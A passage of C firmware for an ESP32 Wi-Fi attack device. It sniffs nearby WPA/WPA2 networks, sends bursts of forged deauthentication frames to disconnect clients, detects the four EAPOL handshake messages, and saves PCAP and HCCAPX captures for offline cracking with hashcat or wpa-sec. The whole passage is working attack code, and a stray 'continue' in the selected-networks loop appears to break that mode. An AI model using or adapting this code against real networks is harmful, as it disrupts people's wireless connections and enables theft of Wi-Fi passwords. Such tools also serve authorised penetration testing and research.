    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
        return 1;
    }
    MY_LOG_INFO(TAG, "SD card initialized on pins MISO:%d MOSI:%d CLK:%d CS:%d",
                SD_MISO_PIN, SD_MOSI_PIN, SD_CLK_PIN, SD_CS_PIN);

    wardrive_promisc_active = true;
    BaseType_t result = xTaskCreate(
        wardrive_promisc_task,
        "wdp_task",
        8192,
        NULL,
        5,
        &wardrive_promisc_task_handle
    );

    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create wardrive promisc task!");
        wardrive_promisc_active = false;
        return 1;
    }

    MY_LOG_INFO(TAG, "Wardrive promisc task started. Use 'stop' to stop.");
    return 0;
}

static int cmd_start_wardrive_promisc(int argc, char **argv) {
    return cmd_start_wardrive_promisc_impl(argc, argv, false);
}

static int cmd_start_wardrive_promisc_trace(int argc, char **argv) {
    return cmd_start_wardrive_promisc_impl(argc, argv, true);
}

// ============================================================================
// Sniffer Handshake: AP and Client Management
// ============================================================================

// Find AP by BSSID in hs_ap_targets, return index or -1
static int hs_find_ap(const uint8_t *bssid) {
    for (int i = 0; i < hs_ap_count; i++) {
        if (memcmp(hs_ap_targets[i].bssid, bssid, 6) == 0) {
            return i;
        }
    }
    return -1;
}

// Add or update AP from beacon. Returns index.
static int hs_add_or_update_ap(const uint8_t *bssid, const char *ssid, uint8_t channel,
                                wifi_auth_mode_t authmode, int rssi) {
    int idx = hs_find_ap(bssid);
    if (idx >= 0) {
        // Update existing
        if (ssid && ssid[0]) strncpy(hs_ap_targets[idx].ssid, ssid, 32);
        hs_ap_targets[idx].channel = channel;
        hs_ap_targets[idx].rssi = rssi;
        if (authmode != WIFI_AUTH_OPEN) hs_ap_targets[idx].authmode = authmode;
        return idx;
    }
    if (hs_ap_count >= HS_MAX_APS) return -1;
    
    idx = hs_ap_count++;
    memcpy(hs_ap_targets[idx].bssid, bssid, 6);
    if (ssid) strncpy(hs_ap_targets[idx].ssid, ssid, 32);
    hs_ap_targets[idx].ssid[32] = '\0';
    hs_ap_targets[idx].channel = channel;
    hs_ap_targets[idx].authmode = authmode;
    hs_ap_targets[idx].rssi = rssi;
    hs_ap_targets[idx].captured_m1 = false;
    hs_ap_targets[idx].captured_m2 = false;
    hs_ap_targets[idx].captured_m3 = false;
    hs_ap_targets[idx].captured_m4 = false;
    hs_ap_targets[idx].complete = false;
    hs_ap_targets[idx].beacon_captured = false;
    hs_ap_targets[idx].last_deauth_us = 0;
    
    // Check if we already have a handshake file for this network
    hs_ap_targets[idx].has_existing_file = 
        check_handshake_file_exists(ssid ? ssid : "") ||
        check_handshake_file_exists_by_bssid(bssid);
    
    if (hs_ap_targets[idx].has_existing_file) {
        // Tab5 parses: strstr("Skipping") && strstr("PCAP already exists")
        MY_LOG_INFO(TAG, "Skipping '%s' - PCAP already exists", 
                   hs_ap_targets[idx].ssid);
    }
    
    return idx;
}

// Find client by MAC, return index or -1
static int hs_find_client(const uint8_t *mac) {
    for (int i = 0; i < hs_client_count; i++) {
        if (memcmp(hs_clients[i].mac, mac, 6) == 0) {
            return i;
        }
    }
    return -1;
}

// Add or update client. Returns index.
static int hs_add_or_update_client(const uint8_t *client_mac, int ap_index, int rssi) {
    int64_t now = esp_timer_get_time();
    int idx = hs_find_client(client_mac);
    if (idx >= 0) {
        // Update existing - keep AP association if already set, or update
        if (ap_index >= 0) hs_clients[idx].hs_ap_index = ap_index;
        hs_clients[idx].rssi = rssi;
        hs_clients[idx].last_seen_us = now;
        return idx;
    }
    if (hs_client_count >= HS_MAX_CLIENTS) return -1;
    
    idx = hs_client_count++;
    memcpy(hs_clients[idx].mac, client_mac, 6);
    hs_clients[idx].hs_ap_index = ap_index;
    hs_clients[idx].rssi = rssi;
    hs_clients[idx].last_seen_us = now;
    hs_clients[idx].last_deauth_us = 0;
    hs_clients[idx].deauthed = false;
    
    // This is a new client - bump the dwell reward counter
    hs_dwell_new_clients++;
    
    return idx;
}

// ============================================================================
// Sniffer Handshake: EAPOL Message Detection (inline, multi-AP)
// ============================================================================

// Determine EAPOL message number from parsed key packet. Returns 1-4 or 0.
static uint8_t hs_get_eapol_msg_num(eapol_key_packet_t *eapol_key) {
    if (!eapol_key) return 0;
    
    // Read Key Information (handle endianness like attack_handshake.c)
    uint16_t key_info_raw = *((uint16_t*)&eapol_key->key_information);
    uint8_t byte0 = (key_info_raw >> 8) & 0xFF;
    uint8_t byte1 = key_info_raw & 0xFF;
    
    bool key_ack = (byte0 & 0x80) != 0;
    bool install = (byte0 & 0x40) != 0;
    bool key_mic = (byte1 & 0x01) != 0;
    
    // M1: ACK=1, Install=0, MIC=0
    if (key_ack && !install && !key_mic) return 1;
    // M3: ACK=1, Install=1, MIC=1
    if (key_ack && install && key_mic) return 3;
    // M2 or M4: ACK=0, MIC=1
    if (!key_ack && key_mic && !install) {
        // M2 has SNonce (non-zero), M4 does not
        bool has_nonce = false;
        for (int i = 0; i < 16; i++) {
            if (eapol_key->key_nonce[i] != 0) { has_nonce = true; break; }
        }
        return has_nonce ? 2 : 4;
    }
    return 0;
}

// ============================================================================
// Sniffer Handshake: Targeted Deauth
// ============================================================================

static void hs_send_targeted_deauth(const uint8_t *station_mac, const uint8_t *ap_bssid, uint8_t channel) {
    // Ensure we're on the correct channel
    uint8_t current_channel;
    wifi_second_chan_t second_chan;
    esp_wifi_get_channel(&current_channel, &second_chan);
    if (current_channel != channel) {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    
    // Build targeted deauth frame (destination = station, not broadcast)
    uint8_t deauth_frame[] = {
        0xC0, 0x00,                                     // Type/Subtype: Deauthentication
        0x00, 0x00,                                     // Duration
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // Destination: station MAC (filled below)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // Source: AP BSSID (filled below)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // BSSID (filled below)
        0x00, 0x00,                                     // Sequence
        0x01, 0x00                                      // Reason: Unspecified
    };
    
    // Set destination to specific station MAC
    memcpy(&deauth_frame[4], station_mac, 6);
    // Set source and BSSID to AP
    memcpy(&deauth_frame[10], ap_bssid, 6);
    memcpy(&deauth_frame[16], ap_bssid, 6);
    
    // Send burst of 5 packets
    for (int i = 0; i < 5; i++) {
        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        if (ret != ESP_OK) {
            ESP_LOGW(TAG, "[HS-DEAUTH] Failed to send deauth #%d: %s", i + 1, esp_err_to_name(ret));
        }
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    
    // Also send deauth from client to AP (bidirectional, increases success)
    memcpy(&deauth_frame[4], ap_bssid, 6);    // Destination: AP
    memcpy(&deauth_frame[10], station_mac, 6); // Source: Station
    memcpy(&deauth_frame[16], ap_bssid, 6);   // BSSID: AP
    for (int i = 0; i < 3; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

// ============================================================================
// Sniffer Handshake: Per-AP PCAP Save
// ============================================================================

// Sanitize SSID for filename (same logic as attack_handshake.c)
static void hs_sanitize_ssid(char *out, const char *in, size_t out_size) {
    size_t j = 0;
    for (size_t i = 0; in[i] && j < out_size - 1; i++) {
        char c = in[i];
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || 
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.') {
            out[j++] = c;
        } else {
            out[j++] = '_';
        }
    }
    out[j] = '\0';
    if (j == 0) {
        strncpy(out, "hidden", out_size - 1);
        out[out_size - 1] = '\0';
    }
}

static bool hs_save_handshake_to_sd(int ap_idx) {
    hs_ap_target_t *ap = &hs_ap_targets[ap_idx];
    
    // We need to have the PCAP buffer populated and HCCAPX ready
    hccapx_t *hccapx = (hccapx_t *)hccapx_serializer_get();
    unsigned pcap_size = pcap_serializer_get_size();
    uint8_t *pcap_buf = pcap_serializer_get_buffer();
    
    if (!pcap_buf || pcap_size == 0) {
        MY_LOG_INFO(TAG, "[HS-SAVE] No PCAP data for '%s'", ap->ssid);
        return false;
    }
    
    // Create directory if needed
    struct stat st = {0};
    if (stat("/sdcard/lab/handshakes", &st) == -1) {
        mkdir("/sdcard/lab/handshakes", 0700);
    }
    
    char ssid_safe[33];
    char mac_suffix[7];
    hs_sanitize_ssid(ssid_safe, ap->ssid, sizeof(ssid_safe));
    snprintf(mac_suffix, sizeof(mac_suffix), "%02X%02X%02X", 
             ap->bssid[3], ap->bssid[4], ap->bssid[5]);
    
    uint64_t timestamp = esp_timer_get_time() / 1000;
    char filename[128];
    
    // Save PCAP
    snprintf(filename, sizeof(filename), "/sdcard/lab/handshakes/%s_%s_%llu.pcap",
             ssid_safe, mac_suffix, (unsigned long long)timestamp);
    
    FILE *f = fopen(filename, "wb");
    if (!f) {
        MY_LOG_INFO(TAG, "[HS-SAVE] Failed to open: %s", filename);
        return false;
    }
    size_t written = fwrite(pcap_buf, 1, pcap_size, f);
    fclose(f);
    
    if (written != pcap_size) {
        MY_LOG_INFO(TAG, "[HS-SAVE] Incomplete write: %zu/%u", written, pcap_size);
        return false;
    }
    MY_LOG_INFO(TAG, "[HS-SAVE] PCAP saved: %s (%u bytes)", filename, pcap_size);
    
    // Save HCCAPX if available
    if (hccapx) {
        snprintf(filename, sizeof(filename), "/sdcard/lab/handshakes/%s_%s_%llu.hccapx",
                 ssid_safe, mac_suffix, (unsigned long long)timestamp);
        f = fopen(filename, "wb");
        if (f) {
            fwrite(hccapx, 1, sizeof(hccapx_t), f);
            fclose(f);
            MY_LOG_INFO(TAG, "[HS-SAVE] HCCAPX saved: %s", filename);
        }
    }
    
    // Sync SD
    int fd = open("/sdcard/.sync", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) { fsync(fd); close(fd); unlink("/sdcard/.sync"); }
    
    // === Backward-compatible UART messages for CardputerADV / Tab5 / FlipperLight ===
    // These exact strings are parsed by all 3 client projects.
    // Tab5 parses "PCAP saved:" and extracts filename from /sdcard/ path.
    printf("PCAP saved: /sdcard/lab/handshakes/%s_%s_%llu.pcap (%u bytes)\n", 
           ssid_safe, mac_suffix, (unsigned long long)timestamp, pcap_size);
    printf("HCCAPX saved: /sdcard/lab/handshakes/%s_%s_%llu.hccapx\n",
           ssid_safe, mac_suffix, (unsigned long long)timestamp);
    // Tab5 parses "HANDSHAKE IS COMPLETE AND VALID"
    printf("HANDSHAKE IS COMPLETE AND VALID\n");
    // All 3 clients parse "Complete 4-way handshake saved for SSID:"
    // CardputerADV/FlipperLight extract SSID after marker until space or '('
    // Tab5 extracts SSID after "SSID:" until space or '('
    printf("Complete 4-way handshake saved for SSID: %s (MAC: %s)\n", ssid_safe, mac_suffix);
    
    return true;
}

// ============================================================================
// Sniffer Handshake: Promiscuous Callback
// ============================================================================

static void hs_sniffer_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!handshake_attack_active) return;
    
    // Only process MGMT and DATA
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    if (len < 24) return; // Minimum 802.11 header
    
    uint8_t frame_type = frame[0] & 0xFC;
    uint8_t to_ds = (frame[1] & 0x01) != 0;
    uint8_t from_ds = (frame[1] & 0x02) != 0;
    
    uint8_t *addr1 = (uint8_t *)&frame[4];
    uint8_t *addr2 = (uint8_t *)&frame[10];
    uint8_t *addr3 = (uint8_t *)&frame[16];
    
    // ---- MGMT frames: beacon, association, auth ----
    if (type == WIFI_PKT_MGMT) {
        if (frame_type == 0x80) {
            // Beacon: extract SSID, channel, authmode
            uint8_t *ap_bssid = addr2;
            
            // Parse tagged parameters for SSID, channel, RSN
            const uint8_t *body = frame + 24 + 12; // Skip MAC header + fixed params (timestamp 8, interval 2, cap 2)
            int body_len = len - 24 - 12;
            
            char ssid[33] = {0};
            uint8_t beacon_channel = pkt->rx_ctrl.channel;
            wifi_auth_mode_t authmode = WIFI_AUTH_OPEN;
            
            int offset = 0;
            while (offset + 2 <= body_len) {
                uint8_t tag = body[offset];
                uint8_t tag_len = body[offset + 1];
                if (offset + 2 + tag_len > body_len) break;
                
                if (tag == 0 && tag_len > 0 && tag_len <= 32) {
                    // SSID
                    memcpy(ssid, &body[offset + 2], tag_len);
                    ssid[tag_len] = '\0';
                } else if (tag == 3 && tag_len == 1) {
                    // DS Parameter Set (channel)
                    beacon_channel = body[offset + 2];
                } else if (tag == 48) {
                    // RSN (WPA2)
                    authmode = WIFI_AUTH_WPA2_PSK;
                } else if (tag == 221) {
                    // Vendor specific - check for WPA OUI
                    if (tag_len >= 4 && body[offset+2] == 0x00 && body[offset+3] == 0x50 && 
                        body[offset+4] == 0xF2 && body[offset+5] == 0x01) {
                        if (authmode == WIFI_AUTH_OPEN) authmode = WIFI_AUTH_WPA_PSK;
                    }
                }
                offset += 2 + tag_len;
            }
            
            // Only track WPA/WPA2 APs (we can't capture handshakes for open networks)
            if (authmode != WIFI_AUTH_OPEN) {
                int ap_idx = hs_add_or_update_ap(ap_bssid, ssid, beacon_channel, authmode, pkt->rx_ctrl.rssi);
                
                // Save beacon frame to PCAP if not yet captured for this AP
                // (beacon is needed for PMK calculation in hashcat/wpa-sec)
                if (ap_idx >= 0 && !hs_ap_targets[ap_idx].beacon_captured && 
                    !hs_ap_targets[ap_idx].has_existing_file && !hs_ap_targets[ap_idx].complete) {
                    pcap_serializer_append_frame(frame, len, pkt->rx_ctrl.timestamp);
                    hs_ap_targets[ap_idx].beacon_captured = true;
                }
            }
            return;
        }
        
        // Association Request (0x00) or Authentication (0xB0): client -> AP
        if (frame_type == 0x00 || frame_type == 0xB0) {
            uint8_t *client_mac = addr2;
            uint8_t *ap_mac = addr1;
            
            // Skip broadcast/multicast
            if (client_mac[0] & 0x01) return;
            
            int ap_idx = hs_find_ap(ap_mac);
            if (ap_idx >= 0 && !hs_ap_targets[ap_idx].has_existing_file && !hs_ap_targets[ap_idx].complete) {
                hs_add_or_update_client(client_mac, ap_idx, pkt->rx_ctrl.rssi);
            }
        }
        return;
    }
    
    // ---- DATA frames: client detection + EAPOL capture ----
    if (type == WIFI_PKT_DATA) {
        uint8_t *client_mac = NULL;
        uint8_t *ap_mac = NULL;
        
        if (to_ds && !from_ds) {
            // STA -> AP
            ap_mac = addr1;
            client_mac = addr2;
        } else if (!to_ds && from_ds) {
            // AP -> STA
            ap_mac = addr2;
            client_mac = addr1;
        } else if (!to_ds && !from_ds) {
            // IBSS
            ap_mac = addr3;
            client_mac = addr2;
        } else {
            return; // WDS
        }
        
        // Skip broadcast/multicast client
        if (client_mac[0] & 0x01) return;
        
        int ap_idx = hs_find_ap(ap_mac);
        if (ap_idx < 0) return; // Unknown AP, ignore
        
        hs_ap_target_t *ap = &hs_ap_targets[ap_idx];
        if (ap->has_existing_file || ap->complete) return; // Already done
        
        // Register client
        hs_add_or_update_client(client_mac, ap_idx, pkt->rx_ctrl.rssi);
        
        // Check for EAPOL: parse the data frame for EAPOL packet
        // The frame payload is a data_frame_t (802.11 data header + LLC/SNAP + EAPOL)
        data_frame_t *data_frame = (data_frame_t *)frame;
        eapol_packet_t *eapol = parse_eapol_packet(data_frame);
        if (!eapol) return; // Not an EAPOL frame
        
        eapol_key_packet_t *eapol_key = parse_eapol_key_packet(eapol);
        if (!eapol_key) return; // Not EAPOL-Key
        
        uint8_t msg_num = hs_get_eapol_msg_num(eapol_key);
        if (msg_num == 0) return;
        
        hs_dwell_eapol_frames++;
        
        bool is_new = false;
        switch (msg_num) {
            case 1: if (!ap->captured_m1) { ap->captured_m1 = true; is_new = true; } break;
            case 2: if (!ap->captured_m2) { ap->captured_m2 = true; is_new = true; } break;
            case 3: if (!ap->captured_m3) { ap->captured_m3 = true; is_new = true; } break;
            case 4: if (!ap->captured_m4) { ap->captured_m4 = true; is_new = true; } break;
        }
        
        if (is_new) {
            MY_LOG_INFO(TAG, "[HS-SNIFF] EAPOL M%d captured for '%s' (%02X:%02X:%02X:%02X:%02X:%02X)",
                       msg_num, ap->ssid,
                       ap->bssid[0], ap->bssid[1], ap->bssid[2], 
                       ap->bssid[3], ap->bssid[4], ap->bssid[5]);
            
            // Append to PCAP
            pcap_serializer_append_frame(frame, len, pkt->rx_ctrl.timestamp);
            
            // Feed to HCCAPX serializer
            hccapx_serializer_add_frame(data_frame);
            
            // Check if complete
            if (ap->captured_m1 && ap->captured_m2 && ap->captured_m3 && ap->captured_m4) {
                ap->complete = true;
                // Tab5 parses: strstr("Handshake captured for") with SSID in quotes
                MY_LOG_INFO(TAG, "Handshake captured for '%s' - all 4 EAPOL messages!", ap->ssid);
            }
        }
    }
}

// Cleanup function for handshake attack
static void handshake_cleanup(void) {
    MY_LOG_INFO(TAG, "Handshake attack cleanup...");
    
    // Stop any active handshake attack (selected mode uses this)
    attack_handshake_stop();
    
    // Disable promiscuous mode (sniffer mode uses this)
    esp_wifi_set_promiscuous(false);
    
    // Reset state
    handshake_attack_active = false;
    handshake_attack_task_handle = NULL;
    handshake_target_count = 0;
    handshake_current_index = 0;
    memset(handshake_targets, 0, MAX_AP_CNT * sizeof(wifi_ap_record_t));
    memset(handshake_captured, 0, sizeof(handshake_captured));
    
    // Reset sniffer handshake state
    hs_ap_count = 0;
    hs_client_count = 0;
    hs_dwell_new_clients = 0;
    hs_dwell_eapol_frames = 0;
    if (hs_ap_targets) memset(hs_ap_targets, 0, HS_MAX_APS * sizeof(hs_ap_target_t));
    if (hs_clients) memset(hs_clients, 0, HS_MAX_CLIENTS * sizeof(hs_client_entry_t));
    
    // Restore idle LED
    esp_err_t led_err = led_set_idle();
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to restore idle LED: %s", esp_err_to_name(led_err));
    }
    
    MY_LOG_INFO(TAG, "Handshake attack cleanup complete.");
}

// Quick scan all channels (both 2.4GHz and 5GHz) - 500ms per channel
// (kept for potential future use; currently unused since sniffer+D-UCB replaced scan-all mode)
static void __attribute__((unused)) quick_scan_all_channels(void) {
    MY_LOG_INFO(TAG, "Quick scanning all channels (2.4GHz + 5GHz)...");
    
    // Scan 2.4GHz channels
    for (int i = 0; i < NUM_CHANNELS_24GHZ && handshake_attack_active && !operation_stop_requested; i++) {
        uint8_t channel = channels_24ghz[i];
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(500)); // 500ms per channel
        
        // Scan would happen here via background scan
        // For now we'll use the global scan results
    }
    
    // Scan 5GHz channels  
    for (int i = 0; i < NUM_CHANNELS_5GHZ && handshake_attack_active && !operation_stop_requested; i++) {
        uint8_t channel = channels_5ghz[i];
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(500)); // 500ms per channel
    }
    
    MY_LOG_INFO(TAG, "Channel scan complete");
}

// Attack network with deauth burst (5 packets)
static void attack_network_with_burst(const wifi_ap_record_t *ap) {
    MY_LOG_INFO(TAG, "Burst attacking '%s' (Ch %d, RSSI: %d dBm)", 
                ap->ssid, ap->primary, ap->rssi);
    
    char burst_l2[64], burst_l3[64];
    snprintf(burst_l2, sizeof(burst_l2), ">> %s", (const char *)ap->ssid);
    snprintf(burst_l3, sizeof(burst_l3), "  Ch %d  %ddB", ap->primary, ap->rssi);
    
    // Start attack on this network
    attack_handshake_start(ap, ATTACK_HANDSHAKE_METHOD_BROADCAST);
    
    // Wait and check for handshake - 3 deauth bursts with 3s wait each
    for (int burst = 0; burst < 3 && handshake_attack_active && !operation_stop_requested; burst++) {
        {
            char burst_l4[64];
            snprintf(burst_l4, sizeof(burst_l4), "  Burst %d/3 ...", burst + 1);
            oled_display_update_full("> WPA Capture", burst_l2, burst_l3, burst_l4);
        }
        
        // Wait 3 seconds for clients to reconnect after deauth
        for (int i = 0; i < 30 && handshake_attack_active && !operation_stop_requested; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
            
            if (i == 15) {
                oled_display_update_full("> WPA Capture", burst_l2, burst_l3, "  Listening...");
            }
            
            // Check if handshake captured
            if (attack_handshake_is_complete()) {
                MY_LOG_INFO(TAG, "✓ Handshake captured for '%s' after burst #%d!", 
                           ap->ssid, burst + 1);
                oled_display_update_full("> WPA Capture", burst_l2, burst_l3, "  >> CAPTURED!");
                
                // Wait 2s to capture any remaining frames
                vTaskDelay(pdMS_TO_TICKS(2000));
                attack_handshake_stop();
                return; // Success!
            }
        }
        
        MY_LOG_INFO(TAG, "Burst #%d complete, trying next...", burst + 1);
    }
    
    // No handshake captured after 3 bursts
    MY_LOG_INFO(TAG, "✗ No handshake for '%s' after 3 bursts", ap->ssid);
    oled_display_update_full("> WPA Capture", burst_l2, burst_l3, "  No handshake");
    attack_handshake_stop();
}

// ============================================================================
// Handshake Attack Task: Selected Networks Mode (unchanged logic)
// ============================================================================
static void handshake_attack_task_selected(void) {
    MY_LOG_INFO(TAG, "===== Selected Networks Mode =====");
    MY_LOG_INFO(TAG, "Attacking %d selected networks in loop until all captured", handshake_target_count);
    
    while (handshake_attack_active && !operation_stop_requested) {
        // Check if we're done
        bool all_captured = true;
        for (int i = 0; i < handshake_target_count; i++) {
            if (!handshake_captured[i]) { all_captured = false; break; }
        }
        if (all_captured) {
            MY_LOG_INFO(TAG, "All selected networks captured! Attack complete.");
            {
                char hs_l3[64];
                snprintf(hs_l3, sizeof(hs_l3), "  %d handshakes", handshake_target_count);
                oled_display_update_full("> WPA Capture", "  All done!", hs_l3, "  Complete!");
            }
            break;
        }
        
        int attacked_count = 0;
        int captured_count = 0;
        
        for (int i = 0; i < handshake_target_count && handshake_attack_active && !operation_stop_requested; i++) {
            wifi_ap_record_t *ap = &handshake_targets[i];
            if (handshake_captured[i]) continue;
            
            if (check_handshake_file_exists((const char*)ap->ssid)) {
                handshake_captured[i] = true;
                captured_count++;
            }
                continue;
            
            attacked_count++;
            MY_LOG_INFO(TAG, ">>> [%d/%d] Attacking '%s' (Ch %d, RSSI: %d dBm) <<<",
                       i + 1, handshake_target_count, (const char*)ap->ssid, ap->primary, ap->rssi);
            
            {
                char hs_l1[64], hs_l2[64], hs_l3[64];
                snprintf(hs_l1, sizeof(hs_l1), "> WPA [%d/%d]", i + 1, handshake_target_count);
                snprintf(hs_l2, sizeof(hs_l2), ">> %s", (const char *)ap->ssid);
                snprintf(hs_l3, sizeof(hs_l3), "  Ch %d  %ddB", ap->primary, ap->rssi);
                oled_display_update_full(hs_l1, hs_l2, hs_l3, "  Attacking...");
            }
            
            attack_network_with_burst(ap);
            
            if (attack_handshake_is_complete()) {
                handshake_captured[i] = true;
                captured_count++;
                MY_LOG_INFO(TAG, "Handshake #%d captured!", captured_count);
            }
            
            if (i < handshake_target_count - 1) {
                vTaskDelay(pdMS_TO_TICKS(2000));
            }
        }
        
        MY_LOG_INFO(TAG, "Cycle: attacked=%d, captured=%d", attacked_count, captured_count);
        
        bool all_done = true;
        int remaining = 0;
        for (int i = 0; i < handshake_target_count; i++) {
            if (!handshake_captured[i]) { all_done = false; remaining++; }
        }
        if (all_done) {
            MY_LOG_INFO(TAG, "All selected networks captured!");
            {
                char hs_l3[64];
                snprintf(hs_l3, sizeof(hs_l3), "  %d handshakes", handshake_target_count);
                oled_display_update_full("> WPA Capture", "  All done!", hs_l3, "  Complete!");
            }
            break;
        }
        {
            char hs_l3[64], hs_l4[64];
            snprintf(hs_l3, sizeof(hs_l3), "  Cap:%d Rem:%d", captured_count, remaining);
            snprintf(hs_l4, sizeof(hs_l4), "  Next cycle...");
            oled_display_update_full("> WPA Capture", "  Cycle done", hs_l3, hs_l4);
        }
        MY_LOG_INFO(TAG, "%d networks remaining, repeating...", remaining);
        vTaskDelay(pdMS_TO_TICKS(3000));
    }
}

// ============================================================================
// Handshake Attack Task: Sniffer + D-UCB Mode (new scan-all replacement)
// ============================================================================
static void handshake_attack_task_sniffer(void) {
    MY_LOG_INFO(TAG, "===== Sniffer + D-UCB Mode =====");
    MY_LOG_INFO(TAG, "Promiscuous sniffer with D-UCB channel selection");
    MY_LOG_INFO(TAG, "Targeted deauth on discovered clients");
    MY_LOG_INFO(TAG, "Channels: %d (2.4GHz + 5GHz)", dual_band_channels_count);
    MY_LOG_INFO(TAG, "D-UCB gamma=%.3f, c=%.1f, dwell=%dms", DUCB_GAMMA, DUCB_C, HS_DWELL_TIME_MS);
    
    // 1. Initialize D-UCB
    ducb_init();
    
    // 2. Reset sniffer state
    hs_ap_count = 0;
    hs_client_count = 0;
    memset(hs_ap_targets, 0, HS_MAX_APS * sizeof(hs_ap_target_t));
    memset(hs_clients, 0, HS_MAX_CLIENTS * sizeof(hs_client_entry_t));
    
    // 3. Initialize PCAP + HCCAPX serializers
    pcap_serializer_init();
    hccapx_serializer_init((const uint8_t *)"", 0); // Will be re-inited per-AP as needed
    
    // 4. Set up promiscuous mode with our callback
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(hs_sniffer_promiscuous_cb);
    esp_wifi_set_promiscuous(true);
    
    MY_LOG_INFO(TAG, "Promiscuous mode enabled. Sniffing...");
    // Tab5 parses: strstr("PHASE") && strstr("Attack")
    MY_LOG_INFO(TAG, "===== PHASE: Sniffer Attack (D-UCB) =====");
    // Tab5 parses: strstr("Scanning") for progress
    MY_LOG_INFO(TAG, "Scanning all channels via D-UCB...");
    
    int64_t last_stats_time = esp_timer_get_time();
    int total_handshakes_captured = 0;
    
    // 5. Main D-UCB loop
    while (handshake_attack_active && !operation_stop_requested) {
        // Select channel via D-UCB
        int ch_idx = ducb_select_channel();
        int channel = ducb_channels[ch_idx].channel;
        
        // Switch channel
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        
        {
            char hss_l2[64], hss_l3[64], hss_l4[64];
            snprintf(hss_l2, sizeof(hss_l2), "  Scan Ch %d", channel);
            snprintf(hss_l3, sizeof(hss_l3), "  AP:%d Cli:%d", hs_ap_count, hs_client_count);
            snprintf(hss_l4, sizeof(hss_l4), "  Cap:%d D-UCB", total_handshakes_captured);
            oled_display_update_full("> WPA Sniffer", hss_l2, hss_l3, hss_l4);
        }
        
        // Reset per-dwell counters
        hs_dwell_new_clients = 0;
        hs_dwell_eapol_frames = 0;
        
        // Dwell on this channel
        vTaskDelay(pdMS_TO_TICKS(HS_DWELL_TIME_MS));
        
        if (!handshake_attack_active || operation_stop_requested) break;
        
        // After dwell: process discovered clients for targeted deauth
        int64_t now = esp_timer_get_time();
        int deauth_count_this_dwell = 0;
        
        for (int i = 0; i < hs_client_count && handshake_attack_active; i++) {
            hs_client_entry_t *client = &hs_clients[i];
            if (client->hs_ap_index < 0 || client->hs_ap_index >= hs_ap_count) continue;
            
            hs_ap_target_t *ap = &hs_ap_targets[client->hs_ap_index];
            
            // Skip if AP already captured or has existing file
            if (ap->complete || ap->has_existing_file) continue;
            
            // Skip if AP is not on current channel
            if (ap->channel != channel) continue;
            
            // Skip if not WPA/WPA2
            if (ap->authmode == WIFI_AUTH_OPEN) continue;
            
            // Skip if client was recently deauthed (cooldown)
            if (client->last_deauth_us > 0 && 
                (now - client->last_deauth_us) < HS_DEAUTH_COOLDOWN_US) continue;
            
            // Send targeted deauth to this client
            // Tab5 parses: strstr(">>> [") && strstr("Attacking") with SSID in quotes
            MY_LOG_INFO(TAG, ">>> Attacking '%s' (Ch %d) - deauth %02X:%02X:%02X:%02X:%02X:%02X <<<",
                       ap->ssid, ap->channel,
                       client->mac[0], client->mac[1], client->mac[2],
                       client->mac[3], client->mac[4], client->mac[5]);
            
            {
                char hss_l2[64], hss_l3[64];
                snprintf(hss_l2, sizeof(hss_l2), ">> %s", ap->ssid);
                snprintf(hss_l3, sizeof(hss_l3), "  Deauth %02X:%02X:%02X",
                         client->mac[3], client->mac[4], client->mac[5]);
                oled_display_update_full("> WPA Sniffer", hss_l2, hss_l3, "  Hunting...");
            }
            
            // Re-init HCCAPX serializer for this AP (so save works correctly)
            {
                size_t ssid_len = strlen(ap->ssid);
                hccapx_serializer_init((const uint8_t *)ap->ssid, ssid_len);
            }
            
            hs_send_targeted_deauth(client->mac, ap->bssid, ap->channel);
            client->last_deauth_us = now;
            client->deauthed = true;
            ap->last_deauth_us = now;
            deauth_count_this_dwell++;
            
            // Limit deauths per dwell to avoid channel congestion
            if (deauth_count_this_dwell >= 3) break;
        }
        
        // If we deauthed someone, stay on this channel a bit longer to catch handshake
        if (deauth_count_this_dwell > 0) {
            vTaskDelay(pdMS_TO_TICKS(2000)); // 2s extra to catch reconnection
        }
        
        // Calculate D-UCB reward
        double reward = (double)hs_dwell_new_clients + 3.0 * (double)hs_dwell_eapol_frames;
        ducb_update(ch_idx, reward);
        
        // Check for completed handshakes and save
        for (int i = 0; i < hs_ap_count; i++) {
            hs_ap_target_t *ap = &hs_ap_targets[i];
            if (ap->complete && !ap->has_existing_file) {
                MY_LOG_INFO(TAG, "Saving complete handshake for '%s'...", ap->ssid);
                // Re-init HCCAPX for this AP before save
                size_t ssid_len = strlen(ap->ssid);
                hccapx_serializer_init((const uint8_t *)ap->ssid, ssid_len);
                
                if (hs_save_handshake_to_sd(i)) {
                    ap->has_existing_file = true;
                    total_handshakes_captured++;
